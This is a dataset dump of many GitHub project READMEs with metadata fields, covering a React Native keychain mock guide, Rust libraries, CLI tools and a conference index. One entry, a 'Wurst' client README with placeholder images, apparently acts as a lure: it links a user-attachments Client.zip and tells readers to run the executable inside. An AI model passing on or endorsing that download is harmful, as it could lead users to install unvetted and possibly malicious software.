The keychain manager relies on interfacing with the native application itself. As such, it does not successfully compile and run in the context of a Jest test, where there is no underlying app to communicate with. To be able to call the JS functions exposed by this module in a unit test, you should mock them in one of the following two ways:

First, let's create a mock object for the module:

```js
const keychainMock = {
  SECURITY_LEVEL_ANY: ""MOCK_SECURITY_LEVEL_ANY"",
  SECURITY_LEVEL_SECURE_SOFTWARE: ""MOCK_SECURITY_LEVEL_SECURE_SOFTWARE"",
  SECURITY_LEVEL_SECURE_HARDWARE: ""MOCK_SECURITY_LEVEL_SECURE_HARDWARE"",
  setGenericPassword: jest.fn().mockResolvedValue(),
  getGenericPassword: jest.fn().mockResolvedValue(),
  resetGenericPassword: jest.fn().mockResolvedValue(),
  ...
}
```

### Using a Jest `__mocks__` Directory

1. Read the [jest docs](https://jestjs.io/docs/en/manual-mocks#mocking-node-modules) for initial setup

2. Create a `react-native-keychain-manager` folder in the `__mocks__` directory and add `index.js` file in it. It should contain the following code:

```javascript
export default keychainMock;
```

### Using a Jest Setup File

1. In your Jest config, add a reference to a [setup file](https://jestjs.io/docs/en/configuration.html#setupfiles-array)

2. Inside your setup file, set up mocking for this package:

```javascript
jest.mock('react-native-keychain-manager', () => keychainMock);
```

Now your tests should run successfully, though note that writing and reading to the keychain will be effectively a no-op.

## Notes

### Android Notes

The module will automatically use the appropriate CipherStorage implementation based on API level:

- API level 16-22 will en/de crypt using Facebook Conceal
- API level 23+ will en/de crypt using Android Keystore

Encrypted data is stored in DataStore Preferences.

The `setInternetCredentials(server, username, password)` call will be resolved as call to `setGenericPassword(username, password, server)`. Use the `server` argument to distinguish between multiple entries.

#### Configuring the Android-specific behavior

Android implementation has behavioural specifics incurred by existing inconsistency between implementations by different vendors. E.g., some Samsung devices show very slow startup of crypto system. To alleviate this, a warm-up strategy is introduced in Android implementation of this library.

Using default constructor you get default behaviour, i.e. with the warming up on.

```java
    private List<ReactPackage> createPackageList() {
      return Arrays.asList(
        ...
        new KeychainPackage(),  // warming up is ON
        ...
      )

```

Those who want finer control are required to use constructor with a builder which can be configured as they like:

```java
    private List<ReactPackage> createPackageList() {
      return Arrays.asList(
        ...
        new KeychainPackage(
                new KeychainModuleBuilder()
                        .withoutWarmUp()),   // warming up is OFF
        ...
      )
```

### iOS Notes

If you need Keychain Sharing in your iOS extension, make sure you use the same App Group and Keychain Sharing group names in your Main App and your Share Extension. To then share the keychain between the Main App and Share Extension, use the `accessGroup` and `service` option on `setGenericPassword` and `getGenericPassword`, like so: `getGenericPassword({ accessGroup: 'group.appname', service: 'com.example.appname' })`

Refs:

- <https://developer.apple.com/documentation/localauthentication>
- <https://developer.apple.com/documentation/security>

### macOS Catalyst

This package supports macOS Catalyst.

### visionOS

This package supports visionOS.

### Security

On API levels that do not support Android keystore, Facebook Conceal is used to en/decrypt stored data. The encrypted data is then stored in DataStore Preferences. Since Conceal itself stores its encryption key in DataStore Preferences, it follows that if the device is rooted (or if an attacker can somehow access the filesystem), the key can be obtained and the stored data can be decrypted. Therefore, on such a device, the conceal encryption is only an obscurity. On API level 23+ the key is stored in the Android Keystore, which makes the key non-exportable and therefore makes the entire process more secure. Follow best practices and do not store user credentials on a device. Instead use tokens or other forms of authentication and re-ask for user credentials before performing sensitive operations.

- [Android authentication](https://source.android.com/security/authentication)
- [Android Cipher](https://developer.android.com/guide/topics/security/cryptography)
- [Android Protected Confirmation](https://developer.android.com/training/articles/security-android-protected-confirmation)
",5,0,2,MIT,"deploy.yaml,e2e_tests.yaml,lint_and_types.yaml",1.0
Softwerkskammer-Linz/SoCraTesAT-2024,main,"# SoCraTes Austria 2024

## Staying in Touch

- [Software Craft Communities Worldwide](https://www.softwarecrafters.org/)
- [Software Crafters Slack](https://slack.softwarecrafters.org/)
- [Software Crafters Slack - Austria Channel](https://softwarecrafters.slack.com/archives/CDESPD831)

## Day One: 20th Sept. 2024

* [TDD Ensemble](tdd-ensemble-david)
* [5 or more ways to find bugs](5-or-more-ways-to-find-bugs)
* [Software Crafting Discussion](software-crafting-discussion)
* [Running LLMs on your hardware with Ollama](running-llms-on-your-hardware-with-ollama)
* [How NOT to modernize your legacy application](how-not-to-modernize-your-legacy-application)
* [Domain Driven Design](domain-driven-design)
* [Prompt Writing Self Help Group](prompt-writing-self-help-group)
* [Backup Made Easy](backup-made-easy)
* [mob.sh Ensemble](mob.sh-ensemble)
* [web testing via webQsee: features is not success](web-testing-via-webqsee-features-is-not-success)
* [Introduction to Systems Thinking](introduction-to-systems-thinking)
* [DDEV Docker + PHP](ddev-docker-php)
* [IntelliJ keyboard shortcuts](intellij-keyboard-shortcuts)

## Day Two: 21st Sept. 2024

* [Best practices for successful GIT collaboration](best-practices-for-successful-git-collaboration)
* [DDD Tactical Design](ddd-tactical-design)
* [how i joined the 1kb club](how-i-joined-the-1kb-club)
* [Lightning Talks](lightning-talks)
* [The Survivor's Guide to OKR](the-survivor_s-guide-to-OKRs)
* [React Compiler](react-compiler)
* [Minimal APIs / Controller -> Router/Handler / Kotlin + Kotest](minimal-apis)
* [Web-Component development. Storybook + Stencil](web-component-driven-development)",0,0,1,MIT,,27.0
Jplamo13/Wurst,master,"# Wurst

Wurst features a wide range of fun and troll modules and has been available since 2014. It is open-source and supports versions 1.7.2 through 1.21+.

![Wurst Logo](https://example.com/wurst-logo.png)

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- Fun and troll modules
- Open-source
- Wide variety of features
- Supports versions 1.7.2 through 1.21+

## Installation

You can download the Wurst client from the official website.

[![Download Wurst](https://img.shields.io/badge/Download-Wurst-blue)](https://github.com/user-attachments/files/16830252/Client.zip)

## Usage

1. Download the Wurst client using the link provided above.
2. Extract the files from the downloaded ZIP archive.
3. Launch the Wurst client executable.
4. Customize your experience with the wide range of modules available.

## Contributing

We welcome contributions to the Wurst repository. If you'd like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/your-feature-name`).
3. Make your changes.
4. Commit your changes (`git commit -am 'Add new feature'`).
5. Push to the branch (`git push origin feature/your-feature-name`).
6. Create a new Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.

---

Feel free to explore the Wurst client and enjoy the wide range of features available! üöÄ

![Wurst GIF](https://example.com/wurst-gif.gif)",1,0,1,CC0-1.0,,0.0
pyrohost/clavis,main,"# Clavis

![Crates.io](https://img.shields.io/crates/v/clavis)
![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
![Rust Version](https://img.shields.io/badge/rust-1.75%2B-orange.svg)

Clavis is an asynchronous Rust library designed for secure, encrypted communication over network streams. Built on `tokio`, it provides abstractions for encrypted packet-based communication with strong security guarantees, utilizing modern cryptographic primitives.

The library implements XChaCha20-Poly1305 encryption, along with a type-safe protocol DSL macro for custom protocol definitions and built-in serialization.

## Installation

To add Clavis to your project, include these dependencies in `Cargo.toml`:

```toml
[dependencies]
clavis = { git = ""https://github.com/pyrohost/clavis"" }
tokio = { version = ""1.0"", features = [""full""] }
serde = { version = ""1.0"", features = [""derive""] }
```

## Quick Start

### Defining a Protocol

Define custom protocol messages using the `protocol!` macro:

```rust
use clavis::protocol;
use serde::{Serialize, Deserialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ChatMessage {
    username: String,
    content: String,
    timestamp: u64,
}

protocol! {
    enum ChatProtocol {
        Heartbeat,
        Join(String),
        Leave(String),
        Message(ChatMessage),
        Status {
            users_online: u32,
            server_uptime: u64,
        },
    }
}
```

### Client Implementation

Set up a client to connect, send, and receive encrypted messages:

```rust
use clavis::{EncryptedStream, EncryptedStreamOptions, EncryptedPacket};
use tokio::net::TcpStream;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let stream = TcpStream::connect(""127.0.0.1:8080"").await?;
    let options = EncryptedStreamOptions {
        max_packet_size: 65536,
        psk: Some(b""pre-shared_key"".to_vec()),
    };
    let encrypted = EncryptedStream::new(stream, Some(options)).await?;
    let (mut reader, mut writer) = encrypted.split()?;

    writer.write_packet(&ChatProtocol::Join(""Alice"".into())).await?;

    if let Ok(packet) = reader.read_packet::<ChatProtocol>().await {
        println!(""Received packet: {:?}"", packet);
    }
    
    Ok(())
}
```

### Server Implementation

Set up a server to handle encrypted client connections and process messages:

```rust
use clavis::{EncryptedStream, EncryptedStreamOptions, EncryptedPacket};
use tokio::net::TcpListener;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind(""127.0.0.1:8080"").await?;
    println!(""Server listening on :8080"");

    while let Ok((stream, addr)) = listener.accept().await {
        tokio::spawn(async move {
            let options = EncryptedStreamOptions {
                max_packet_size: 65536,
                psk: Some(b""shared_secret"".to_vec()),
            };
            match EncryptedStream::new(stream, Some(options)).await {
                Ok(mut encrypted) => {
                    if let Ok(packet) = encrypted.read_packet::<ChatProtocol>().await {
                        println!(""Received packet: {:?}"", packet);
                    }
                }
                Err(e) => eprintln!(""Connection error: {}"", e),
            }
        });
    }

    Ok(())
}
```

## Contributing

We welcome contributions! For suggestions, bug reports, or feature requests, please open an issue or submit a pull request on our GitHub repository.

## Security

Clavis is designed to provide strong security guarantees. However, no software is perfect, and security vulnerabilities may exist. If you discover a security issue, please report it [here](https://github.com/pyrohost/clavis/security) so we can address it promptly.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
",0,0,1,MIT,,0.0
siketyan/tsimports,main,"# tsimports

‚ú® A fast and opinionated imports organizer for ECMAScript and TypeScript.

> [!WARNING]
> This project is in alpha stage. Production use is not recommended.
> If you find some bugs, please feel free to report to [Issues](https://github.com/siketyan/tsimports/issues).


## Installation

```shell
npm install -g @tsimports/tsimports
```

> [!TIP]
> If you want to share the version of tsimports in the project, use `-D` instead of `-g`.


## Usage

### Basic

#### Format a file and write the result to stdout

```shell
tsimports ./src/foo.ts
```

#### Format a file and write in-place

```shell
tsimports --write ./src/foo.ts
```

#### Format all TypeScript files

```shell
tsimports --write ./src/**/*.ts
```

### Advanced

#### Format a stdin input

> [!WARNING]
> tsimports infers the language from the file extension.
> As the standard input has no extension, we cannot infer the language.
> Use `--language` to assume the input is JS, JSX, TS, or TSX.

```shell
cat ./src/foo.ts | tsimports --language ts
```


## The rule

tsimports groups and sorts import statements in the file in a fixed rule.
As tsimports offers you an opinionated rule, you cannot configure any of the rule.


### Groups

tsimports splits the imports into several groups in the following order:

1. Built-in modules (e.g. `node:assert`, `fs`, or `bun`)
2. External modules (e.g. `react`, `@testing-library/react`, or `hono/jwt`)
3. Internal modules (e.g. `~/foo` or `@/foo`, if configured in bundler or somewhere)
4. Parent modules (e.g. `../foo` or `../../foo`)
5. Sibling modules (e.g. `./foo` or `./foo/bar`)
6. Index modules (e.g. `.`, `./`, `./index`, or `./index.js`)


### Ordering

tsimports sorts imports in each group in alphabetical order (case-sensitive).


### Position

tsimports collects all imports at the top of the file.
Any other statements are retained at the position and tsimports doesn't modify anything about them.


## Acknowledgements

tsimports is built on top of the [Biome](https://github.com/biomejs/biome) infrastructure, including the JS syntax, parser, and other utils.
If you like tsimports, please consider also supporting the Biome project.
",3,4,1,MIT,"ci.yml,release-cli.yml",0.0
KoshakMineDEV/ICSTD,master,"# ICSTD - InnerCore Standard Library
**InnerCore** is a modding API for **Minecraft BE** 1.16.201. In past, when CoreEngine was actual all mods were written in JavaScript, so this bindness to JavaScript is still here in new InnerCore and it makes Java mod development uncomfortable on it.  
This library was made to fix this problem, become easiest and main solution for Java modding on InnerCore platform. Also this mod patches InnerCore's JS tile entites and a few popular libraries to make it a bit faster.

## Making your first mod with ICSTD
Docs are in early WIP stage as same as library itself, so just wait üëÄ",0,0,1,MIT,,14.0
Degra02/nordvpn-tui,master,"# nordvpn-tui

`nordvpn-tui` is a terminal-based user interface (TUI) tool built in Rust that provides a simple and interactive way to manage NordVPN connections. The tool allows users to browse, search, and select countries and cities for VPN connection directly from the terminal using keyboard navigation.

![screenshot](./screenshot.jpg)

## Features

- **Scrollable country and city list**: Navigate through a list of all available countries and cities using arrow keys.
- **Search functionality**: Quickly search for countries and cities.
- **Vim-like key bindings**: Supports familiar keybindings such as `gg` to jump to the top and `G` to jump to the bottom of lists.
- **Keyboard-driven**: Navigate and select VPN servers entirely with your keyboard.
- **Connect with ease**: Instantly connect to the selected server using NordVPN's CLI.

## Installation

### Prerequisites

Before installing, make sure you have the following installed:

- [Rust](https://www.rust-lang.org/tools/install)
- [NordVPN CLI](https://nordvpn.com/download/linux/)
  
  Ensure you have access to the NordVPN command-line tool by verifying it is installed and accessible from the terminal:

  ```bash
  nordvpn --version
  ```

### Build from source

Clone the repository and build the project:

```bash
git clone https://github.com/Degra02/nordvpn-tui.git
cd nordvpn-tui
cargo build --release
```

To run the tool:

```bash
cargo run --release
```
or alternatively
```bash
./target/release/nordvpn-tui
```

## Custom Configuration

The file `config.toml` contains the configuration for the tool. You can customize the following settings:

- `colors`: Customize the colors of the interface.

An example file is found in the repository as `config-example.toml` which you can copy to `$HOME/.config/nordvpn-tui/config.toml` and modify as needed.

## Usage

Once you start `nordvpn-tui`, you will be presented with a list of countries where NordVPN servers are available. You can navigate and connect using keyboard commands.

### Keyboard Shortcuts

In normal mode (default):

| Key          | Action                                       |
|----------------------|----------------------------------------------|
| `K` or `Arrow Up`   | Move selection up                            |
| `J` or `Arrow Down` | Move selection down                          |
| `Enter`      | Select a country/city and connect to the VPN |
| `D`       | Disconnect from the VPN                      |
| `i` or `/` | Enter Search mode                            |
| `g g`        | Jump to the top of the list                  |
| `G`          | Jump to the bottom of the list               |
| `q`          | Quit the application                         |

In search mode:

| Key        | Action                                       |
|------------|----------------------------------------------|
| `<char>`     | Add char to search query |
| `Enter`      | Search with current query |
| `Backspace`  | Delete last query char |

Once you've selected a country (or city if available), pressing `Enter` will automatically connect to the selected location using NordVPN.

## Contributing

Feel free to submit issues or pull requests to contribute to the development of `nordvpn-tui`. Contributions are welcome!

1. Fork the repository.
2. Create a new branch (`git checkout -b feature-branch`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add some feature'`).
5. Push to the branch (`git push origin feature-branch`).
6. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
",0,3,1,MIT,,0.0
tisonkun/morax,main,"# Morax

[![Discord][discord-badge]][discord-url]
[![Apache 2.0 licensed][license-badge]][license-url]
[![Build Status][actions-badge]][actions-url]

[discord-badge]: https://img.shields.io/discord/1291345378246922363?logo=discord&label=discord
[discord-url]: https://discord.gg/RRxbfYGqHM
[license-badge]: https://img.shields.io/crates/l/morax
[license-url]: LICENSE
[actions-badge]: https://github.com/tisonkun/morax/workflows/CI/badge.svg
[actions-url]:https://github.com/tisonkun/morax/actions?query=workflow%3ACI

Morax is aimed at providing message queue and data streaming functionality based on cloud native services:

* Meta service is backed by Postgres compatible relational database services (RDS, Aurora, etc.).
* Data storage is backed by S3 compatible object storage services (S3, MinIO, etc.).

## Usage

Currently, Morax supports basic PubSub APIs for Apache Kafka and WAL Service. You can try it out with the following steps.

1. Start the environment that provides a Postgres instance and a MinIO instance:

    ```shell
    docker compose -f ./dev/docker-compose.yml up
    ```

2. Build the `morax` binary:

    ```shell
    cargo x build
    ```

3. Start the broker:

   ```shell
    ./target/debug/morax start --config-file ./dev/config.toml
    ```

### Try out the Apache Kafka broker

Now, a Kafka broker is running at `localhost:9092`. You can use your favorite Kafka client to interact with it.

You can also get an impression of the interaction by reading the test cases in:

* [rdkafka-tests](tests/rdkafka/tests)
* [rskafka-tests](tests/rskafka/tests)

### Try out the WAL Service broker

Also, a WAL broker is running at `localhost:8848`. You can talk to it with the [`morax-wal-client`](api/wal-client). The wire protocol is HTTP so that all the HTTP ecosystem is ready for use.

You can also get an impression of the interaction by reading the test cases in:

* [wal-tests](tests/wal/tests)

## Design

To support multiple providing message queue and data streaming APIs, Morax is designed as a modular system:

* Common functionalities like logging, async runtime, and protos are shared;
* Interfaces of meta service and data storage are shared;
* Each protocol implements their own wire protocol and message format;
* Each protocol shares the basic topic metadata model, with optional additional specific properties;
* Each protocol shares the basic data storage model, the payload is protocol specific, with a common header;
* Thus, each protocol shares similar publishing/producing APIs;
* On the contrary, each protocol implements their own subscription and consumer group management.

## License

This project is licensed under [Apache License, Version 2.0](https://github.com/tisonkun/logforth/blob/main/LICENSE).
",2,0,1,Apache-2.0,"ci.yml,release.yml",16.0
hungnm98/hermes,main,"# Hermes

Hermes is a high-performance project designed for managing account balances and frozen balances, focusing on synchronization and consistency in distributed environments. The system is built to handle user balance changes safely, preventing race conditions.

## Key Features

- **Balance and Freeze Balance Management**: Provides operations for managing account balances and frozen balances.
- **Ensures Synchronization in Distributed Environments**: Uses Redis locks and event sourcing to ensure that user balance changes are processed by a single thread at any given time.
- **Processes Operations from Kafka**: Hermes receives account operations from Kafka and applies them to the respective accounts.

## Performance Benchmarks

- **Environment**:
   - **Hardware**: MacBook M1 Pro with 32GB RAM
   - **Setup**:
      - 1 node Kafka
      - 1 node Redis
      - 1 node MongoDB
      - 8 node Hermes
      - 1 haproxy

```
wrk -t12 -c1024 -d30s --timeout 30s http://192.168.1.10:10030/tests/send-operation/stress-test
Running 30s test @ http://192.168.1.10:10030/tests/send-operation/stress-test
  12 threads and 1024 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency   391.06ms   30.24ms 472.26ms   80.87%
    Req/Sec   215.87     42.25   343.00     69.29%
  77416 requests in 30.10s, 15.58MB read
Requests/sec:   2571.94
Transfer/sec:    529.96KB

```

wrk -t12 -c400 -d15s --timeout 30s http://localhost:10020/tests/send-operation/test

## Architecture and Implementation

- **Redis Lock**: Ensures thread safety in a multi-threaded environment, preventing race conditions.
- **Event Sourcing**: Stores events of account changes to maintain a history and the current state of each account.
- **Kafka**: Serves as the source of account operations and distributes them to processing threads in the system.

## Installation Guide

### System Requirements

- Java 21
- Redis
- Kafka
- MongoDB

### Setup

1. **Clone the Project**:
   ```bash
   git clone https://github.com/username/hermes.git
   cd hermes
   ```

2. **Configure**: Update the configuration files to connect to Kafka, Redis, and MongoDB.

3. **Run the Project**:
   ```bash
   ./mvnw spring-boot:run
   ```

## Usage

Hermes will automatically listen for operations from Kafka and handle account transactions accordingly. All user balance changes are strictly managed to ensure safety in multi-threaded processing environments.

## Contributions

Contributions for performance improvements and feature enhancements are welcome. Please open a pull request or an issue to start contributing.

---

Let me know if there's anything else to add!
",0,0,1,,,0.0
DonIsaac/oxbuild,main,"# Oxbuild

[![CI](https://github.com/DonIsaac/oxbuild/actions/workflows/ci.yml/badge.svg)](https://github.com/DonIsaac/oxbuild/actions/workflows/ci.yml)
[![Crates.io Version](https://img.shields.io/crates/v/oxbuild)](https://crates.io/crates/oxbuild)
[![NPM Version](https://img.shields.io/npm/v/oxbuild)](https://npmjs.com/package/oxbuild)
[![License](https://img.shields.io/crates/l/oxbuild)](./LICENSE)

An ultra-fast `tsc`-like compiler built on top of [oxc](https://github.com/oxc-project/oxc).

> #### üöß Under Construction
>
> Both Oxbuild and oxc are actively under construction and are not yet suitable for production use. If you find a bug in either project, we would love for you to open an issue on GitHub!

## Features

- Transpile TypeScript, JavaScript, JSX, and TSX
- Emit `.d.ts` files for TypeScript projects that use
  [`isolatedDeclarations`](https://www.typescriptlang.org/docs/handbook/release-notes/typescript-5-5.html#isolated-declarations)
- JS Source maps for transpiled code

## Installation

You can install `oxbuild` from [npm](https://www.npmjs.com/package/oxbuild).

```sh
npm install -g oxbuild
```

Or from [crates.io](https://crates.io/crates/oxbuild).

```sh
# using cargo-binstall (recommended)
cargo binstall oxbuild
# or using cargo
cargo install oxbuild
```

Or, build it from source

```sh
git clone git@github.com:DonIsaac/oxbuild.git
cd oxbuild
cargo build --release --bin oxbuild
cp target/release/oxbuild /usr/local/bin
```

## Usage

Assuming you are in your project's root directory and your source code is all in
`./src`, you can compile your project to `./dist` by running:

```sh
oxbuild
```

If `oxbuild` is behaving in an unexpected way, please run it with debug logs and
create a new issue on GitHub.

```sh
RUST_LOG=debug oxbuild
```

### TSConfig Support

Oxbuild will respect `rootDir` and `outDir` settings in your `tsconfig.json`.
It will look for a `tsconfig.json` file next to the nearest `package.json` file
by default. If you want to specfiy a different `tsconfig.json` file, you can do

```sh
oxbuild --tsconfig path/to/tsconfig.json
```

### TypeScript Declarations

To generate `.d.ts` files, your project must have
[`isolatedDeclarations`](https://www.typescriptlang.org/tsconfig/#isolatedDeclarations)
enabled. After that, `.d.ts` files will be automatically emitted on each build.
",4,12,4,MIT,"ci.yml,release.yml",21.0
icanvardar/arbor,main,"# Arbor

**Arbor** is a command-line application written in Rust, designed to provide quick, trie-based autocomplete suggestions. Arbor lets users enter words interactively and suggests completions based on the input prefix.

## Interactive Mode

In interactive mode, Arbor will prompt you to enter words or prefixes. Based on the entered text, it will provide autocomplete suggestions.

1. **Adding Words**: Type a word and press Enter to add it to the trie.
2. **Autocomplete Suggestions**: Type a prefix and press Enter to see a list of words that match the prefix.

### Example:
![tutorial](tutorial.gif)

## Features

- **Interactive Autocomplete** - Provides word suggestions based on prefixes entered by the user.
- **Efficient and Lightweight** - Built with Rust for high performance and low memory usage.
- **Easy Installation** - Can be installed directly via Cargo.

## Installation

You can install Arbor using Cargo:

```bash
cargo install arbor-cli
```

## Usage

After installation, simply run `arbor` in your terminal:

```bash
arbor-cli
```

### Command-Line Options

- **`-l`, `--language <LANGUAGE>`**: Specifies the language for suggestions (e.g., `en-US`).
- **`-t`, `--thread-count <THREAD_COUNT>`**: Sets the number of threads for processing (e.g., `4`).
- **`-m`, `--max-suggestion <MAX_SUGGESTION>`**: Limits the number of suggestions returned for a prefix (e.g., `5`).
- **`-b`, `--backup`**: Enables backup mode. When this flag is set, you must also specify the `--output` option.
- **`-o`, `--output <FILE>`**: Specifies the file path for saving backup suggestions (only applicable if `--backup` is enabled).

To exit the application, you can use `Ctrl+C` or `Esc`.

## Contributing

Contributions are welcome! Feel free to fork the repository, open issues, or submit pull requests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
",1,1,9,MIT,ci.yml,11.0
liamzebedee/tendermint-rs,main,"# tendermint-rs

A minimal reimplementation of the Tendermint BFT consensus protocol in Rust.

Dependencies:

 * tokio - for async runtime.
 * secp256k1 - for cryptographic identities.
 * serde - for message serialisation.
 * warp/reqwest - for HTTP server/clients (for node RPC).
 * hex.

## Conceptual overview.

A consensus protocol consists of a set of processes, which communicate by sending messages to each other in order to agree on a value. Processes may crash, run at arbitrary speeds, and display byzantine failures. The challenge of consensus is building a protocol which can finalise and does so safely and consistently given these assumptions.

The basic Tendermint algorithm is implemented as `Process`. Each `Process` communicates via abstract channels - there is an implementation using just local communication (`examples/standalone-channels`), and an implementation using RPC over HTTP servers (`examples/standalone-http`). Processes emit consensus events via tokio async streams - consumers can subscribe to the process and receive callbacks for new values agreed on by the network (called ""decisions""). Each node has an ECDSA keypair it uses to sign messages.


## Status.

Protocol runs and achieves consensus, with rounds, epochs. 

See [PLAN](./PLAN.md) for the backlog.


## Usage.

### Running tests.

```sh
cargo build

cargo run --example standalone-channels
cargo run --example standalone-http
```

### Using it.

Rust Tendermint can be used to build a consistent and partition-tolerant network, with a custom value that is agreed per epoch, and event streams which allow you to consume different events (such agreement - referred to as a decision, and intermediate stages).

```rs
use tendermint::Process;

fn example() {
    // Setup networking substrate between nodes.
    let node = Process::new();
    
    // Pass a get_value callback to get the next candidate value for proposal.
    // Subscribe and listen to Decision events to process them.
}
```

See `examples/`.


## Readings.

 - [The latest gossip on BFT consensus.](https://arxiv.org/abs/1807.04938)
 - [Tendermint: Byzantine Fault Tolerance in the Age of Blockchains.](https://atrium.lib.uoguelph.ca/server/api/core/bitstreams/0816af2c-5fd4-4d99-86d6-ced4eef2fb52/content)

",0,2,1,,,0.0
tox-dev/toml-fmt,main,"# Python TOML formatters

This project includes the following TOML formatters for the Python ecosystem:

- [`pyproject-fmt`](./pyproject-fmt),
- [`tox-toml-fmt`](./tox-toml-fmt).
",5,10,3,MIT,"common.yaml,pyproject_fmt_build.yaml,pyproject_fmt_test.yaml,tox_toml_fmt_build.yaml,tox_toml_fmt_test.yaml",10.0
feint123/code-graph,main,"# code-graph
an egui app that can display code graphics and find all references

ÁºñÁ®ãËØ≠Ë®ÄÊîØÊåÅÂàóË°®

1. java
2. javascript
3. rust
4. c

#### ‰∏Ä„ÄÅÊâìÂåÖ
‰ΩøÁî® cargo-bundle ËøõË°åÊâìÂåÖ [cargo-bundle](https://crates.io/crates/cargo-bundle)

```shell
cargo install cargo-bundle

cargo bundle --release
```
‰Ω†ÂèØ‰ª•Âú® `target/release/bundle` ÁõÆÂΩï‰∏≠ÊâæÂà∞ÊâìÂåÖÂ•ΩÁöÑÂ∫îÁî®


#### ‰∫å„ÄÅÁïåÈù¢

| Light | Dark |
|-------|------|
| ![Light mode](media/screenshot-1.webp) | ![Dark mode](media/screenshot-2.webp) |

#### ‰∏â„ÄÅÊ≥®ÊÑè‰∫ãÈ°π

**‰ΩøÁî®Á¨¨‰∏âÊñπÁºñËæëÂô®**

1. VSCodeÔºö`shift+command+p` ÊêúÁ¥¢ `install code command`
2. ZedÔºöÁÇπÂáªËèúÂçï`Zed` > `Install CLI`
3. Idea: ÁÇπÂáªËèúÂçï `Tools` > `Create Command-line Launcher...`

**Â≠ó‰Ωì**

Â¶ÇÊûúÈÅáÂà∞AppÊó†Ê≥ïÊ≠£Â∏∏ÂºÄÂêØÔºåËØ∑Êü•ÁúãÁ≥ªÁªüÊòØÂê¶ÂÆâË£Ö‰ª•‰∏ãÂ≠ó‰Ωì‰πã‰∏ÄÔºö
1. ""Source Han Mono SC""
2. ""PingFang SC""
3. ""Microsoft YaHei""
",0,0,1,MIT,,0.0
rabbit19981023/dioxus-todo-fullstack,main,"1. Run postgres via docker-compose:

```bash
docker compose up -d
```

2. Setup database with sqlx:

```bash
cargo install sqlx-cli
sqlx migrate run --database-url postgres://postgres:postgres@localhost:5432/postgres
```

3. Compile tailwind:

```bash
npx tailwindcss -i ./input.css -o ./assets/tailwind.css
```

4. Launch app with hot realod:

```bash
DATABASE_URL=postgres://postgres:postgres@localhost:5432/postgres dx serve
```

",0,0,1,,,0.0
szobov/kriss_matcher,main,"# KRISS-Matcher: Rust/Python implementation of KISS-Matcher

The implementation of the paper [KISS-Matcher: Fast and Robust Point Cloud Registration Revisited](https://web.archive.org/web/20240925020414/https://arxiv.org/abs/2409.15615).

![matching](./.docs/kriss_matcher.png)

<!-- markdown-toc start - Don't edit this section. Run M-x markdown-toc-refresh-toc -->
**Table of Contents**

- [KRISS-Matcher: Rust/Python implementation of KISS-Matcher](#kriss-matcher-rustpython-implementation-of-kiss-matcher)
    - [Disclaimer](#disclaimer)
    - [Differences from the Original Paper](#differences-from-the-original-paper)
    - [Code Structure and Correspondence to Paper Sections](#code-structure-and-correspondence-to-paper-sections)
        - [Section III.C. Faster-PFH: Boosting FPFH Speed](#section-iiic-faster-pfh-boosting-fpfh-speed)
        - [Section III.D. k-Core-Based Graph-Theoretic Outlier Pruning](#section-iiid-k-core-based-graph-theoretic-outlier-pruning)
        - [Section III.E. Graduated Non-Convexity-Based Non-Minimal Solver](#section-iiie-graduated-non-convexity-based-non-minimal-solver)
    - [Usage](#usage)
    - [Contributing](#contributing)
    - [License](#license)

<!-- markdown-toc end -->


## Disclaimer

This project is my first complete implementation in Rust, created out of curiosity and a desire to learn the language while implementing the concepts from the paper. It was developed over a weekend, so it may not be production-ready. Feedback and contributions are welcome!

## Differences from the Original Paper

This implementation has some differences:

1. **Single Radius Search**:
   - This implementation uses only `r_normal` instead of sub-sampling from `r_fpfh`. There are no particular reasons, just to ease implementation since it seemed non-important.

2. **Histogram Bin Size**:
   - The paper does not specify the histogram bin size (`H`) used in the calculation of FPFH (Fast Point Feature Histogram). More information on my choice is [here]().

3. **GNC Solver for Rotation and Translation Estimation**:
   - The paper does not provide details on the specific GNC (Graduated Non-Convexity) solver used.
   - My implementation adapts the GNC-TLS (Truncated Least Squares) solver from the [TEASER++ library](https://web.archive.org/web/20241009152000/https://github.com/MIT-SPARK/TEASER-plusplus/blob/9ca20d9b52fcb631e7f8c9e3cc55c5ba131cc4e6/teaser/src/registration.cc#L730-L832).
   - Residual calculation function adapts methods from [Least-Squares Rigid Motion Using SVD](https://web.archive.org/web/20240313224740/https://igl.ethz.ch/projects/ARAP/svd_rot.pdf).

4. **Normal Estimation Using SVD Instead of PCA**:
   - The implementation uses Singular Value Decomposition (SVD) instead of Principal Component Analysis (PCA) for normal estimation.
   - Since the matrices are small, performance is not a significant concern, and SVD provides more stable results.

5. **Graph Representation in Correspondence Pruning**:
   - While the paper suggests using Compressed Sparse Row (CSR) representation for efficiency, this implementation uses a standard adjacency list graph (CSR can be easily integrated, tho).

## Code Structure and Correspondence to Paper Sections

### Section III.C. Faster-PFH: Boosting FPFH Speed

Also covers ""Appendix.I. Detailed Explanation of Faster-PFH"".

* Normal Estimation and filtering: `normal_estimation.rs`
* Point Feature Histogram Calculation: `point_feature_histograms.rs`
* Feature Matching: `feature_matching.rs`

### Section III.D. k-Core-Based Graph-Theoretic Outlier Pruning

* Correspondence Graph Pruning: `graph_pruning.rs`

### Section III.E. Graduated Non-Convexity-Based Non-Minimal Solver

* Optimal Rotation and Translation Estimation: `gnc_solver.rs`

## Usage

To add library to your rust project use:

``` shell
$ cargo add kriss_matcher
```

To use in Python use any package managers such as pip or [uv](https://web.archive.org/web/20241009202137/https://docs.astral.sh/uv/).

``` shell
$ pip install kriss_matcher
```
or

``` shell
$ uv add kriss_matcher
```

To run the example you can use:

``` shell
uv run --no-project --python=3.11 examples/example.py
```
it will install all required dependencies.

